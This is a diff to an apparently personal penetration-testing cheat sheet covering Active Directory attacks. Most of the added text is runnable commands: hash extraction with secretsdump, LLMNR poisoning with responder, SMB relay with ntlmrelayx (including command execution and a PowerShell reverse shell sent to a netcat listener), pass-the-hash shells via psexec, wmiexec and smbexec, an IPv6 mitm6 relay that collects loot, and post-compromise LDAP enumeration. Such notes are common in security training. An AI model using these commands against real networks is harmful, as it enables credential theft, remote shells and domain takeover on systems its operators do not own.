@@ -455,9 +455,10 @@ Extract the hash from windows. you need to have sam, security, and system files
 -     secretsdump.py -sam SAM -security SECURITY -system SYSTEM local
 
 -----------------------------------------------------------------Active Directory---------------------------------------------------------------------
-Active Directory:
+# Active Directory:
 .          NTDS.dit is a file that has all of the passwords. stored in %SystemRoot%\NTDS
 
+**before getting the shell**
 LLMNR Poisoning
 .          responder -I eth0 -dwPv
 .          dir \\<Kali_IP>\test
@@ -469,11 +470,30 @@ SMB Relay
 .    1     ntlmrelayx.py -tf targets.txt -smb2support     (put the target IP in targets.txt)
 .          dir \\<Kali_IP>\test
 .          you should have got the SAM database hashes
-.    2     ntlmrelayx.py -tf targets.txt -smb2support -i     (it will start interactive SMB client shell via TCP on 127.0.0.1:11000)
+.    2     ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"     (run a command)
+.          dir \\<Kali_IP>\test
+.    3     ntlmrelayx.py -tf targets.txt -smb2support -i     (it will start interactive SMB client shell via TCP on 127.0.0.1:11000)
 .          dir \\<Kali_IP>\test
 .          nc 127.0.0.1 11000
-.    3     sudo impacket-ntlmrelayx --no-http-server -smb2support -t <IP> -c "powershell -enc <payload>"     (send a powershell reverse shell payload)
+.    4     sudo impacket-ntlmrelayx --no-http-server -smb2support -t <IP> -c "powershell -enc <payload>"     (send a powershell reverse shell payload)
 .          nc -nlvp 9001
+Getting a shell access     
+use psecex.py  or   wmiexec.py  or   smbexec.py
+.          impacket-psexec -hashes NL:NTLM Administrator@<IP>
+.          psexec.py <username>:'<password>'@<IP>
+.          psexec.py <username>@<IP> -hashes <NT:NTLM>
+.          wmiexec.py <username>@<IP> -hashes <NT:NTLM>
+.          smbexec.py <username>@<IP> -hashes <NT:NTLM>
+IPv6 Attack     If IPv6 is enabled and there is no DNS resolution in this case we can use mitm6 tool to compromise IPv6 resolution
+.          ntlmrelayx.py -6 -t ldaps://<Target_IP> -wh fakewpad.<domain ex. raman.local> -l loot
+.          mitm6 -d <domain ex. raman.local>
+.          you need to do such an event like rebooting the system. if successful check the loot file in your kali directory 
+
+**enum after getting initial access**
+POST-COMPROMISE AD ENUMERATION
+ldapdomaindump     (you can use this instead of ntlmrelayx.py -6)
+.          ldapdomaindump ldaps://10.0.2.16 -u 'raman' -p password
+bloodhound
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Platforms
